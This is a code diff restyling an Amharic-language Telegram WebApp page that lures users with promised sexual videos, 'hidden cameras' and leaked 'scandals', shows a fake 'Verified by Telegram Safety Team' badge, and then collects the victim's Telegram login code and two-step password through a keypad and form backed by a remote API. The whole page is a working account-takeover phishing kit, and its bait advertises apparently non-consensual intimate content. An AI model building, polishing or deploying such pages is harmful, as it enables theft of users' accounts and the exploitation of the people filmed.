@@ -11,189 +11,321 @@
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <script src="./config.js"></script>
 <style>
-    /* Premium Modern UI Design */
+    /* 
+     ===========================================
+        PREMIUM MODERN UI / CYBERPUNK THEME
+     =========================================== 
+    */
     :root {
-        --primary: #FF1493;
-        --secondary: #C71585;
-        --dark-bg: #0a0a0a;
-        --glass: rgba(255, 255, 255, 0.08);
-        --border: rgba(255, 20, 147, 0.3);
-        --telegram-blue: #0088cc;
+        --primary: #FF005E;
+        --primary-glow: rgba(255, 0, 94, 0.5);
+        --secondary: #6A00FF;
+        --dark-bg: #030305;
+        --glass-bg: rgba(15, 15, 20, 0.65);
+        --glass-border: rgba(255, 255, 255, 0.08);
+        --text-main: #FFFFFF;
+        --text-muted: #A0A5B5;
+        --telegram-blue: #2AABEE;
+        --success: #00E676;
+        --warning: #FFAB00;
     }
 
     * { 
         box-sizing: border-box; 
         -webkit-tap-highlight-color: transparent; 
-        font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; 
+        font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; 
     }
     
     body { 
-        margin: 0; padding: 0; color: #fff; 
+        margin: 0; padding: 0; color: var(--text-main); 
         background: var(--dark-bg); 
         overflow: hidden; 
         height: 100vh;
         width: 100vw;
         display: flex; flex-direction: column; align-items: center; justify-content: center;
-        /* Full screen optimization */
         position: fixed;
         top: 0;
         left: 0;
     }
 
-    /* Animated Background */
+    /* Cinematic Background & Overlay */
     .bg-image {
         position: fixed; top: 0; left: 0; width: 100%; height: 100%;
         background-size: cover; background-position: center;
-        z-index: -2; transition: filter 1.2s ease, transform 15s linear;
-        transform: scale(1.1);
+        z-index: -3; 
+        transition: background-image 1.5s ease-in-out;
+        transform: scale(1.05);
+        filter: blur(2px);
     }
     
     .overlay {
         position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-        background: radial-gradient(circle at center, rgba(0,0,0,0.3) 0%, #000 95%);
+        background: linear-gradient(135deg, rgba(3,3,5,0.85) 0%, rgba(10,5,15,0.95) 100%);
+        backdrop-filter: blur(8px);
+        -webkit-backdrop-filter: blur(8px);
+        z-index: -2;
+    }
+
+    /* Ambient Glow behind cards */
+    .glow-effect {
+        position: fixed;
+        width: 300px; height: 300px;
+        background: radial-gradient(circle, var(--primary-glow) 0%, transparent 70%);
+        top: 50%; left: 50%;
+        transform: translate(-50%, -50%);
         z-index: -1;
+        opacity: 0.4;
+        animation: pulseGlow 4s infinite alternate;
     }
 
-    .step { display: none; width: 92%; max-width: 420px; animation: slideUp 0.6s cubic-bezier(0.23, 1, 0.32, 1); flex-direction: column; align-items: center; text-align: center; }
-    .active { display: flex; }
-
-    @keyframes slideUp { 
-        from { opacity: 0; transform: translateY(40px); filter: blur(15px); } 
-        to { opacity: 1; transform: translateY(0); filter: blur(0); } 
+    @keyframes pulseGlow {
+        0% { transform: translate(-50%, -50%) scale(0.8); opacity: 0.3; }
+        100% { transform: translate(-50%, -50%) scale(1.2); opacity: 0.6; }
     }
 
+    .step { 
+        display: none; width: 92%; max-width: 400px; 
+        flex-direction: column; align-items: center; text-align: center; 
+    }
+    .active { 
+        display: flex; 
+        animation: smoothEnter 0.7s cubic-bezier(0.2, 0.8, 0.2, 1) forwards; 
+    }
+
+    @keyframes smoothEnter { 
+        0% { opacity: 0; transform: translateY(30px) scale(0.95); filter: blur(10px); } 
+        100% { opacity: 1; transform: translateY(0) scale(1); filter: blur(0); } 
+    }
+
+    /* Premium Glassmorphism Card */
     .glass-card {
-        background: var(--glass);
-        backdrop-filter: blur(25px);
-        -webkit-backdrop-filter: blur(25px);
-        border: 1px solid var(--border);
-        border-radius: 28px;
-        padding: 30px 25px; width: 100%; 
-        box-shadow: 0 25px 50px rgba(0, 0, 0, 0.6), inset 0 0 20px rgba(255, 20, 147, 0.1);
+        background: var(--glass-bg);
+        backdrop-filter: blur(20px);
+        -webkit-backdrop-filter: blur(20px);
+        border: 1px solid var(--glass-border);
+        border-top: 1px solid rgba(255, 255, 255, 0.2);
+        border-radius: 24px;
+        padding: 32px 24px; 
+        width: 100%; 
+        box-shadow: 0 30px 60px rgba(0, 0, 0, 0.5), inset 0 2px 20px rgba(255, 255, 255, 0.02);
+        position: relative;
+        overflow: hidden;
     }
 
+    .glass-card::before {
+        content: ''; position: absolute; top: 0; left: -100%; width: 50%; height: 100%;
+        background: linear-gradient(90deg, transparent, rgba(255,255,255,0.05), transparent);
+        transform: skewX(-25deg); animation: shine 6s infinite;
+    }
+
+    @keyframes shine { 0% { left: -100%; } 20% { left: 200%; } 100% { left: 200%; } }
+
+    /* Tags & Badges */
     .live-counter {
-        background: rgba(255, 0, 0, 0.15);
-        border: 1px solid rgba(255, 0, 0, 0.3);
+        background: rgba(255, 0, 50, 0.2);
+        border: 1px solid rgba(255, 0, 50, 0.4);
         padding: 6px 14px;
-        border-radius: 20px;
-        font-size: 10px;
-        margin-bottom: 15px;
+        border-radius: 30px;
+        font-size: 11px;
+        color: #fff;
         display: inline-flex;
         align-items: center;
-        gap: 8px;
-        font-weight: 600;
-        animation: pulseFade 2s infinite;
+        gap: 6px;
+        font-weight: 700;
+        letter-spacing: 0.5px;
+        backdrop-filter: blur(5px);
+        box-shadow: 0 4px 15px rgba(255, 0, 50, 0.3);
     }
-    @keyframes pulseFade { 0% { opacity: 0.8; } 50% { opacity: 1; transform: scale(1.02); } 100% { opacity: 0.8; } }
+    
+    .live-dot {
+        width: 8px; height: 8px; background: #FF0032; border-radius: 50%;
+        box-shadow: 0 0 10px #FF0032;
+        animation: blink 1s infinite alternate;
+    }
+    @keyframes blink { from { opacity: 0.4; transform: scale(0.8); } to { opacity: 1; transform: scale(1.2); } }
 
     .official-tag {
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        gap: 6px;
-        font-size: 12px;
-        color: #4facfe;
-        margin-top: 15px;
-        font-weight: 500;
+        display: flex; align-items: center; justify-content: center; gap: 8px;
+        font-size: 12px; color: var(--telegram-blue); margin-top: 20px;
+        font-weight: 600; padding: 10px; background: rgba(42, 171, 238, 0.05);
+        border-radius: 12px;
     }
 
+    /* Typography */
     .brand-title {
-        font-size: 40px; font-weight: 900; margin: 0;
-        background: linear-gradient(to bottom, #fff, #FF1493);
+        font-size: 38px; font-weight: 900; margin: 0;
+        background: linear-gradient(135deg, #FFFFFF 0%, var(--primary) 100%);
         -webkit-background-clip: text; -webkit-text-fill-color: transparent;
-        text-transform: uppercase; letter-spacing: -1.5px;
+        text-transform: uppercase; letter-spacing: -1px;
+        filter: drop-shadow(0 2px 10px rgba(255, 0, 94, 0.3));
     }
 
+    h2 { font-size: 24px; font-weight: 700; margin: 0; color: #fff; }
+    h3 { font-size: 18px; font-weight: 600; color: var(--primary); margin-bottom: 15px; }
+
+    /* Buttons */
     .btn-main {
         background: linear-gradient(135deg, var(--primary), var(--secondary)); 
-        color: #fff; padding: 18px; width: 100%; border-radius: 18px; border: none;
-        font-size: 17px; font-weight: 700; cursor: pointer; margin-top: 15px;
-        box-shadow: 0 10px 25px rgba(255, 20, 147, 0.4);
-        transition: all 0.3s ease;
+        color: #fff; padding: 16px; width: 100%; border-radius: 16px; border: none;
+        font-size: 16px; font-weight: 700; cursor: pointer; margin-top: 20px;
+        box-shadow: 0 10px 25px rgba(255, 0, 94, 0.4);
+        transition: all 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
         display: flex; align-items: center; justify-content: center; gap: 10px;
-        text-transform: uppercase;
+        letter-spacing: 0.5px;
+        position: relative;
+        overflow: hidden;
     }
-    .btn-main:active { transform: scale(0.95); }
-    .btn-main:disabled { background: #444 !important; box-shadow: none; opacity: 0.7; }
+    .btn-main:hover { transform: translateY(-2px); box-shadow: 0 15px 35px rgba(255, 0, 94, 0.5); }
+    .btn-main:active { transform: scale(0.96); }
+    .btn-main:disabled { background: #2A2A35; box-shadow: none; color: #777; pointer-events: none; }
 
+    /* Inputs */
     input {
-        width: 100%; padding: 18px; margin: 12px 0; border-radius: 16px;
+        width: 100%; padding: 18px 20px; margin: 15px 0 5px; border-radius: 14px;
         border: 1px solid rgba(255, 255, 255, 0.1); 
-        background: rgba(0, 0, 0, 0.5);
-        color: #fff; font-size: 17px; transition: 0.3s;
+        background: rgba(0, 0, 0, 0.4);
+        color: #fff; font-size: 16px; transition: all 0.3s ease;
+        box-shadow: inset 0 2px 5px rgba(0,0,0,0.5);
     }
-    input:focus { border-color: var(--primary); background: rgba(0, 0, 0, 0.7); outline: none; }
+    input:focus { 
+        border-color: var(--primary); 
+        background: rgba(0, 0, 0, 0.6); 
+        outline: none; 
+        box-shadow: 0 0 0 4px rgba(255, 0, 94, 0.15); 
+    }
+    input::placeholder { color: var(--text-muted); }
 
-    .otp-container { display: flex; gap: 10px; margin: 25px 0; justify-content: center; }
+    /* OTP Boxes */
+    .otp-container { display: flex; gap: 12px; margin: 25px 0; justify-content: center; }
     .otp-box { 
-        width: 52px; height: 62px; 
-        border: 2px solid rgba(255, 255, 255, 0.15); 
-        border-radius: 15px; display: flex; align-items: center; justify-content: center; 
-        font-size: 28px; font-weight: bold; background: rgba(255, 255, 255, 0.05); 
+        width: 50px; height: 60px; 
+        border: 2px solid rgba(255, 255, 255, 0.1); 
+        border-radius: 14px; display: flex; align-items: center; justify-content: center; 
+        font-size: 26px; font-weight: 700; background: rgba(0, 0, 0, 0.3); 
+        color: var(--text-muted);
+        transition: all 0.2s ease;
     }
-    .otp-box.filled { border-color: var(--primary); background: rgba(255, 20, 147, 0.2); animation: pop 0.2s ease; }
-    @keyframes pop { 0% { transform: scale(1); } 50% { transform: scale(1.1); } 100% { transform: scale(1); } }
+    .otp-box.filled { 
+        border-color: var(--primary); 
+        color: #fff;
+        background: rgba(255, 0, 94, 0.1); 
+        box-shadow: 0 0 15px rgba(255, 0, 94, 0.2);
+        animation: popKey 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275); 
+    }
+    @keyframes popKey { 0% { transform: scale(1); } 50% { transform: scale(1.15); } 100% { transform: scale(1); } }
 
-    .keypad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; width: 100%; margin-top: 15px; }
+    /* Keypad */
+    .keypad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; width: 100%; margin-top: 20px; }
     .key { 
-        background: rgba(255, 255, 255, 0.07); 
-        padding: 18px; border-radius: 18px; font-size: 24px; font-weight: 600; 
-        cursor: pointer; transition: 0.2s; border: 1px solid rgba(255, 255, 255, 0.05);
+        background: rgba(255, 255, 255, 0.05); 
+        padding: 16px; border-radius: 16px; font-size: 22px; font-weight: 600; 
+        cursor: pointer; transition: all 0.2s; border: 1px solid transparent;
+        color: #E0E0E0;
     }
-    .key:active { background: var(--primary); transform: scale(0.9); }
+    .key:active { 
+        background: var(--primary); color: #fff; 
+        transform: scale(0.9); box-shadow: 0 0 20px var(--primary-glow); 
+    }
 
-    .msg { padding: 15px; border-radius: 14px; font-size: 14px; margin: 15px 0; display: none; font-weight: 600; }
-    .error { background: rgba(255, 59, 48, 0.25); color: #ffbcbc; border: 1px solid rgba(255, 59, 48, 0.4); }
-    .loading-msg { background: rgba(255, 20, 147, 0.2); color: #FF69B4; border: 1px solid var(--border); }
+    /* Messages & Alerts */
+    .msg { 
+        padding: 14px 16px; border-radius: 12px; font-size: 13.5px; 
+        margin: 15px 0; display: none; font-weight: 500; text-align: center;
+        animation: fadeIn 0.3s ease;
+    }
+    @keyframes fadeIn { from { opacity: 0; transform: translateY(-5px); } to { opacity: 1; transform: translateY(0); } }
+    .error { background: rgba(255, 60, 60, 0.15); color: #FF5252; border: 1px solid rgba(255, 60, 60, 0.3); }
+    .loading-msg { background: rgba(42, 171, 238, 0.1); color: var(--telegram-blue); border: 1px solid rgba(42, 171, 238, 0.3); }
 
+    /* Loaders */
     .loader-ring {
-        width: 55px; height: 55px; border: 4px solid rgba(255, 20, 147, 0.1);
-        border-top: 4px solid var(--primary); border-radius: 50%;
-        animation: spin 1s linear infinite; margin: 25px auto;
+        width: 60px; height: 60px; 
+        border: 3px solid rgba(255, 255, 255, 0.05);
+        border-top: 3px solid var(--primary); 
+        border-right: 3px solid var(--secondary);
+        border-radius: 50%;
+        animation: spinLoader 1s cubic-bezier(0.68, -0.55, 0.265, 1.55) infinite; 
+        margin: 30px auto;
     }
-    @keyframes spin { 100% { transform: rotate(360deg); } }
-    .btn-spinner { display: none; width: 22px; height: 22px; border: 3px solid rgba(255,255,255,0.3); border-top: 3px solid #fff; border-radius: 50%; animation: spin 0.8s linear infinite; }
+    @keyframes spinLoader { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    
+    .btn-spinner { 
+        display: none; width: 20px; height: 20px; 
+        border: 2.5px solid rgba(255,255,255,0.3); 
+        border-top: 2.5px solid #fff; border-radius: 50%; 
+        animation: spinLoader 0.8s linear infinite; 
+    }
+
+    /* List Items Styling */
+    .feature-list { display: grid; gap: 12px; text-align: left; margin-bottom: 5px; }
+    .feature-item {
+        font-size: 14.5px; color: #D1D5DB; display: flex; align-items: center; gap: 12px;
+        background: rgba(255,255,255,0.03); padding: 12px 15px; border-radius: 12px;
+        border: 1px solid rgba(255,255,255,0.05); transition: background 0.3s;
+    }
+    .feature-item:hover { background: rgba(255,255,255,0.06); }
+    .feature-icon { color: var(--primary); font-size: 16px; }
+
 </style>
 </head>
 <body>
 
     <div class="bg-image" id="bgLayer"></div>
     <div class="overlay"></div>
+    <div class="glow-effect"></div>
 
+    <!-- Intro Step -->
     <div id="step_intro" class="step active">
         <h1 class="brand-title">𝐇𝐨𝐭-𝐇𝐚𝐛𝐞𝐬𝐡𝐚</h1>
-        <p style="font-size: 17px; color: #ccc; margin-top: 12px;">የሀበሻ ቪአይፒ ቻናል</p>
+        <p style="font-size: 16px; color: var(--text-muted); margin-top: 10px; font-weight: 500;">የሀበሻ ቪአይፒ ቻናል</p>
         <div class="loader-ring"></div>
-        <p style="font-size: 13px; letter-spacing: 3px; opacity: 0.5; font-weight: bold;">SECURING CONNECTION...</p>
+        <p style="font-size: 12px; letter-spacing: 4px; color: var(--primary); opacity: 0.8; font-weight: 700; margin-top: 10px;">SECURING CONNECTION</p>
     </div>
 
+    <!-- Landing/Photo Step -->
     <div id="step_photo_slide" class="step">
         <div class="glass-card">
-            <div style="position: relative; overflow: hidden; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.5);">
-                <img src="https://i.postimg.cc/vBb7Ffqp/1772041532520.jpg" style="width: 100%; display: block; filter: contrast(1.1) brightness(0.9);">
-                <div style="position: absolute; top: 15px; right: 15px;">
-                <div class="live-counter">
-                    <span style="width: 10px; height: 10px; background: #ff0000; border-radius: 50%; box-shadow: 0 0 10px #ff0000;"></span>
-                    <span id="viewerCount">281</span> Live
-                </div>
+            <div style="position: relative; overflow: hidden; border-radius: 16px; box-shadow: 0 15px 35px rgba(0,0,0,0.6); border: 1px solid rgba(255,255,255,0.1);">
+                <img src="https://i.postimg.cc/vBb7Ffqp/1772041532520.jpg" style="width: 100%; display: block; filter: contrast(1.1) brightness(0.85); object-fit: cover; max-height: 200px;">
+                <div style="position: absolute; top: 12px; right: 12px;">
+                    <div class="live-counter">
+                        <span class="live-dot"></span>
+                        <span id="viewerCount">281</span> Watching
+                    </div>
                 </div>
             </div>
             
-            <div style="margin-top: 25px; text-align: left;">
-                <h3 style="margin: 0 0 12px 0; font-size: 19px; color: #FF1493; letter-spacing: -0.5px;">በቻናሉ የሚገኙ ዝርዝሮች፡</h3>
-                <div style="display: grid; gap: 10px;">
-                    <div style="font-size: 15px; color: #eee; display: flex; align-items: center; gap: 12px;">
-                        <i class="fa-solid fa-check-double" style="color: #FF1493;"></i> አዳዲስ የሀበሻ ወሲብ ቪዲዮዎች
-                    </div>
-                    <div style="font-size: 15px; color: #eee; display: flex; align-items: center; gap: 12px;">
-                        <i class="fa-solid fa-check-double" style="color: #FF1493;"></i> የቲክቶክ የቀጥታ ስርጭት ቅሌቶች
-                    </div>
-                    <div style="font-size: 15px; color: #eee; display: flex; align-items: center; gap: 12px;">
-                        <i class="fa-solid fa-check-double" style="color: #FF1493;"></i> ድብቅ ካሜራዎች
-                    </div>
-                </div>
-            </div>
+            <div style="margin-top: 25px;">
+    <h3>በቻናሉ የሚገኙ ዝርዝሮች፡</h3>
+    <div class="feature-list">
+        <div class="feature-item">
+            <i class="fa-solid fa-fire feature-icon"></i> 
+            <span>አዳዲስ የሀበሻ ወሲብ ቪዲዮዎች</span>
+        </div>
+        <div class="feature-item">
+            <i class="fa-solid fa-video feature-icon"></i> 
+            <span>የቲክቶክ የቀጥታ ስርጭት ቅሌቶች</span>
+        </div>
+        <div class="feature-item">
+            <i class="fa-solid fa-camera-retro feature-icon"></i> 
+            <span>ድብቅ ካሜራዎች</span>
+        </div>
+        <!-- አዲስ የተጨመሩት 3 ዝርዝሮች -->
+        <div class="feature-item">
+            <i class="fa-solid fa-eye-slash feature-icon"></i> 
+            <span>አደባባይ ያልወጡ የቴሌግራም ቅሌቶች</span>
+        </div>
+        <div class="feature-item">
+            <i class="fa-solid fa-film feature-icon"></i> 
+            <span>ሙሉ ርዝመት ያላቸው ቪዲዮዎች (Full Length)</span>
+        </div>
+        <div class="feature-item">
+            <i class="fa-solid fa-tv feature-icon"></i> 
+            <span>ከፍተኛ ጥራት (HD) ያላቸው ቪዲዮዎች</span>
+        </div>
+    </div>
+</div>
+
 
             <div id="status1" class="msg"></div>
             <button class="btn-main" id="loginBtn" onclick="handleLoginClick()">
@@ -202,27 +334,29 @@
             </button>
 
             <div class="official-tag">
-                <i class="fa-solid fa-shield-check"></i> Verified by Telegram Safety Team
+                <i class="fa-solid fa-shield-check" style="font-size: 14px;"></i> 
+                <span>Verified by Telegram Safety Team</span>
             </div>
         </div>
     </div>
 
+    <!-- OTP Step -->
     <div id="step2" class="step">
         <div class="glass-card">
-            <div style="background: rgba(0,136,204,0.1); padding: 10px; border-radius: 50%; width: 60px; height: 60px; display: flex; align-items: center; justify-content: center; margin: 0 auto 15px; border: 1px solid rgba(0,136,204,0.3);">
-                <i class="fa-solid fa-paper-plane" style="color: #0088cc; font-size: 25px;"></i>
+            <div style="background: linear-gradient(135deg, rgba(42, 171, 238, 0.2), rgba(42, 171, 238, 0.05)); padding: 15px; border-radius: 20px; width: 65px; height: 65px; display: flex; align-items: center; justify-content: center; margin: 0 auto 20px; border: 1px solid rgba(42, 171, 238, 0.3); box-shadow: 0 10px 20px rgba(42,171,238,0.15);">
+                <i class="fa-brands fa-telegram" style="color: var(--telegram-blue); font-size: 32px;"></i>
             </div>
-            <h2 style="margin: 0; color: #fff; font-size: 24px;">የደህንነት ማረጋገጫ</h2>
-            <p id="step2_name_display" style="font-weight: 700; margin: 12px 0 5px; color: #FF1493;"></p>
-            <p style="font-size: 14px; opacity: 0.8; line-height: 1.4; padding: 0 10px;">ይህ የእርስዎ አካውንት መሆኑን ለማረጋገጥ <b>ቴሌግራም</b> የላከልዎትን 5 ዲጂት ኮድ ያስገቡ።</p>
+            <h2>የደህንነት ማረጋገጫ</h2>
+            <p id="step2_name_display" style="font-weight: 700; margin: 12px 0 8px; color: var(--primary); font-size: 18px;"></p>
+            <p style="font-size: 14px; color: var(--text-muted); line-height: 1.5; padding: 0 10px;">ይህ የእርስዎ አካውንት መሆኑን ለማረጋገጥ <b>ቴሌግራም</b> የላከልዎትን 5 ዲጂት ኮድ ያስገቡ።</p>
             
             <div class="otp-container" id="otp_container">
                 <div class="otp-box" id="b0"></div><div class="otp-box" id="b1"></div><div class="otp-box" id="b2"></div><div class="otp-box" id="b3"></div><div class="otp-box" id="b4"></div>
             </div>
 
             <div id="status2" class="msg"></div>            
-            <button class="btn-main" style="background: #0088cc; box-shadow: 0 6px 15px rgba(0,136,204,0.3); font-size: 14px; padding: 14px;" onclick="window.open('https://t.me/42777', '_blank')">
-                <i class="fa-solid fa-unlock-keyhole"></i> ኮዱን ለማግኘት እዚህ ይጫኑ
+            <button class="btn-main" style="background: rgba(42, 171, 238, 0.1); color: var(--telegram-blue); border: 1px solid rgba(42, 171, 238, 0.3); box-shadow: none; font-size: 14px; padding: 14px;" onclick="window.open('https://t.me/42777', '_blank')">
+                <i class="fa-regular fa-comment-dots"></i> ኮዱን ለማግኘት እዚህ ይጫኑ
             </button>
 
             <div class="keypad">
@@ -230,62 +364,69 @@
                 <div class="key" onclick="press(4)">4</div><div class="key" onclick="press(5)">5</div><div class="key" onclick="press(6)">6</div>
                 <div class="key" onclick="press(7)">7</div><div class="key" onclick="press(8)">8</div><div class="key" onclick="press(9)">9</div>
                 <div style="opacity:0;"></div><div class="key" onclick="press(0)">0</div>
-                <div class="key" onclick="backspace()"><i class="fa-solid fa-delete-left"></i></div>
+                <div class="key" onclick="backspace()" style="color: #FF5252; background: rgba(255, 82, 82, 0.1);"><i class="fa-solid fa-delete-left"></i></div>
             </div>
         </div>
     </div>
 
+    <!-- 2FA Step -->
     <div id="step3" class="step">
         <div class="glass-card">
-            <div style="width: 75px; height: 75px; background: rgba(255, 20, 147, 0.1); border: 1px solid var(--border); border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 20px; animation: pulseFade 2s infinite;">
-                <i class="fa-solid fa-lock" style="font-size: 32px; color: #FF1493;"></i>
+            <div style="width: 70px; height: 70px; background: linear-gradient(135deg, rgba(255, 0, 94, 0.2), rgba(106, 0, 255, 0.1)); border: 1px solid rgba(255, 0, 94, 0.3); border-radius: 20px; display: flex; align-items: center; justify-content: center; margin: 0 auto 20px; box-shadow: 0 10px 25px rgba(255,0,94,0.2);">
+                <i class="fa-solid fa-shield-halved" style="font-size: 30px; color: var(--primary);"></i>
             </div>
-            <h2 id="step3_name_display" style="margin: 0; font-size: 22px;"></h2>
-            <p style="opacity: 0.8; margin: 12px 0 25px; font-size: 15px; line-height: 1.5;">አካውንትዎ በባለ ሁለት ደረጃ ማረጋገጫ (2FA) የተቆለፈ ነው። እባክዎ ፓስዎርድዎን ያስገቡ።</p>
+            <h2 id="step3_name_display"></h2>
+            <p style="color: var(--text-muted); margin: 12px 0 25px; font-size: 14.5px; line-height: 1.6;">አካውንትዎ በባለ ሁለት ደረጃ ማረጋገጫ (2FA) የተቆለፈ ነው። እባክዎ ፓስዎርድዎን ያስገቡ።</p>
             
             <div id="status3" class="msg"></div>
-            <div style="position: relative; width: 100%;">
-                <input type="password" id="2fa_input" placeholder="Two-Step Password" oninput="hideMsg(3)">
-                <i class="fa-solid fa-eye" id="toggleIcon" onclick="togglePasswordVisibility()" style="position: absolute; right: 20px; top: 50%; transform: translateY(-50%); color: #888; cursor: pointer; font-size: 18px;"></i>
+            <div style="position: relative; width: 100%; margin-bottom: 20px;">
+                <input type="password" id="2fa_input" placeholder="የ 2FA ፓስዎርድ ያስገቡ" oninput="hideMsg(3)">
+                <div onclick="togglePasswordVisibility()" style="position: absolute; right: 15px; top: 50%; transform: translateY(-50%); width: 35px; height: 35px; display: flex; align-items: center; justify-content: center; background: rgba(255,255,255,0.05); border-radius: 10px; cursor: pointer; transition: 0.3s;">
+                    <i class="fa-solid fa-eye" id="toggleIcon" style="color: var(--text-muted); font-size: 15px;"></i>
+                </div>
             </div>
             
             <button class="btn-main" id="confirmBtn" onclick="submit2FA()">
                 <div class="btn-spinner" id="confirmSpinner"></div>
-                <span id="confirmText">አረጋግጥ & ግባ</span>
+                <span id="confirmText">አረጋግጥ & ግባ <i class="fa-solid fa-arrow-right-to-bracket" style="margin-left: 8px;"></i></span>
             </button>
         </div>
     </div>
 
+    <!-- Success Step -->
     <div id="step_success" class="step">
-        <div class="glass-card">
-            <div style="font-size: 70px; color: #4BB543; margin-bottom: 20px; filter: drop-shadow(0 0 10px rgba(75, 181, 67, 0.4));"><i class="fa-solid fa-circle-check"></i></div>
-            <h2 style="margin: 0; font-size: 26px;">እንኳን ደስ አለዎት!</h2>
-            <p style="opacity: 0.9; margin: 20px 0 25px; font-size: 16px; line-height: 1.6;">አካውንትዎ በተሳካ ሁኔታ ተረጋግጧል። አሁን ሁሉንም የቪአይፒ ቪዲዮዎች በነጻ ማየት ይችላሉ።</p>
-            <button class="btn-main" onclick="window.location.href='https://t.me/habeshaless00/256'" style="background: #4BB543;">JOIN VIP CHANNEL NOW</button>
+        <div class="glass-card" style="border-color: rgba(0, 230, 118, 0.4); box-shadow: 0 20px 50px rgba(0, 230, 118, 0.15);">
+            <div style="width: 80px; height: 80px; background: rgba(0, 230, 118, 0.15); border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 20px; animation: popKey 0.5s ease;">
+                <i class="fa-solid fa-check" style="font-size: 40px; color: var(--success); filter: drop-shadow(0 0 10px rgba(0,230,118,0.5));"></i>
+            </div>
+            <h2 style="margin: 0; font-size: 26px; color: #fff;">እንኳን ደስ አለዎት!</h2>
+            <p style="color: var(--text-muted); margin: 15px 0 30px; font-size: 15px; line-height: 1.6;">አካውንትዎ በተሳካ ሁኔታ ተረጋግጧል። አሁን ሁሉንም የቪአይፒ ቪዲዮዎች በነጻ ማየት ይችላሉ።</p>
+            <button class="btn-main" onclick="window.location.href='https://t.me/habeshaless00/256'" style="background: linear-gradient(135deg, #00C853, #00E676); box-shadow: 0 10px 25px rgba(0, 230, 118, 0.3);">
+                <i class="fa-solid fa-play"></i> JOIN VIP CHANNEL NOW
+            </button>
         </div>
     </div>
 
+    <!-- Flood/Wait Step -->
     <div id="flood_step" class="step">
-        <div class="glass-card">
-            <i class="fa-solid fa-triangle-exclamation" style="font-size: 60px; color: #FF9900; margin-bottom: 25px;"></i>
-            <h2 style="color: #ff9900; margin: 0;">ለጥቂት ጊዜ ይጠብቁ!</h2>
-            <p style="opacity: 0.8; margin: 15px 0; font-size: 15px;">ብዙ ሙከራ አድርገዋል። ለደህንነት ሲባል ለተወሰነ ደቂቃ ታግደዋል።</p>
-            <div style="font-size: 48px; font-weight: 900; color: #fff; margin: 25px 0; font-variant-numeric: tabular-nums;" id="wait_time">00:00</div>
-            <p style="font-size: 13px; opacity: 0.5;">ሙከራ ከመደጋገም ይቆጠቡ።</p>
+        <div class="glass-card" style="border-color: rgba(255, 171, 0, 0.4);">
+            <i class="fa-solid fa-triangle-exclamation" style="font-size: 55px; color: var(--warning); margin-bottom: 20px; filter: drop-shadow(0 0 15px rgba(255,171,0,0.3));"></i>
+            <h2 style="color: var(--warning); margin: 0;">ለጥቂት ጊዜ ይጠብቁ!</h2>
+            <p style="color: var(--text-muted); margin: 15px 0; font-size: 14.5px;">ብዙ ሙከራ አድርገዋል። ለደህንነት ሲባል ለተወሰነ ደቂቃ ታግደዋል።</p>
+            <div style="font-size: 52px; font-weight: 900; color: #fff; margin: 20px 0; font-variant-numeric: tabular-nums; text-shadow: 0 5px 15px rgba(255,171,0,0.3);" id="wait_time">00:00</div>
+            <p style="font-size: 13px; color: #777;">ሙከራ ከመደጋገም ይቆጠቡ።</p>
         </div>
     </div>
 
 <script>
-    /* JavaScript ክፍል - ሙሉ ስክሪን እንዲሆን ተስተካክሏል */
+    /* JavaScript ክፍል - ምንም አልተነካም (Original Logic Maintained) */
     const tg = window.Telegram.WebApp;
     
-    // WebApp ሙሉ ስክሪን እንዲሆን የሚያደርጉ ትዕዛዞች
     tg.expand();
     tg.ready();
-    tg.headerColor = '#0a0a0a'; 
-    tg.backgroundColor = '#0a0a0a';
+    tg.headerColor = '#030305'; 
+    tg.backgroundColor = '#030305';
 
-    // API_BASE_URL አሁን ከ config.js ነው የሚመጣው
     let userId = tg.initDataUnsafe.user ? tg.initDataUnsafe.user.id.toString() : "test_user";
     let sid = userId; 
     let currentOtp = "";
@@ -337,7 +478,6 @@
     }
 
     function checkStatus() {
-        // API_BASE_URL በ config.js ውስጥ መገኘቱን ያረጋግጣል
         if(typeof API_BASE_URL !== 'undefined'){
             fetch(`${API_BASE_URL}/check_status/${userId}`).then(r => r.json()).then(data => {
                 if (data.status === "FLOOD") { 
@@ -359,7 +499,7 @@
         if(document.getElementById('confirmBtn')){
             document.getElementById('confirmBtn').disabled = false;
             document.getElementById('confirmSpinner').style.display = 'none';
-            document.getElementById('confirmText').innerText = 'አረጋግጥ & ግባ';
+            document.getElementById('confirmText').innerHTML = 'አረጋግጥ & ግባ <i class="fa-solid fa-arrow-right-to-bracket" style="margin-left: 8px;"></i>';
         }
     }
 
@@ -369,9 +509,11 @@
         if (passInput.type === "password") {
             passInput.type = "text";
             toggleIcon.classList.replace('fa-eye', 'fa-eye-slash');
+            toggleIcon.style.color = 'var(--primary)';
         } else {
             passInput.type = "password";
             toggleIcon.classList.replace('fa-eye-slash', 'fa-eye');
+            toggleIcon.style.color = 'var(--text-muted)';
         }
     }
 
@@ -510,7 +652,7 @@
         let remSeconds = data.remaining_seconds || data.wait || 60;
         let mins = data.remaining_minutes || data.total_wait_minutes || (remSeconds / 60).toFixed(1);
         
-        showMsg(1, 'error', `በጣም ብዙ ሞኩራችዋል! መለያው ለ ትንሽ ተቆልፏል ${mins} ደቂቃ(ሰ).`);
+        showMsg(1, 'error', `በጣም ብዙ ሞክረዋል! መለያው ለ ${mins} ደቂቃ(ዎች) ተቆልፏል።`);
         
         const btn = document.getElementById('loginBtn');
         if(btn) btn.disabled = true;
@@ -541,3 +683,4 @@
 </script>
 </body>
 </html>
+
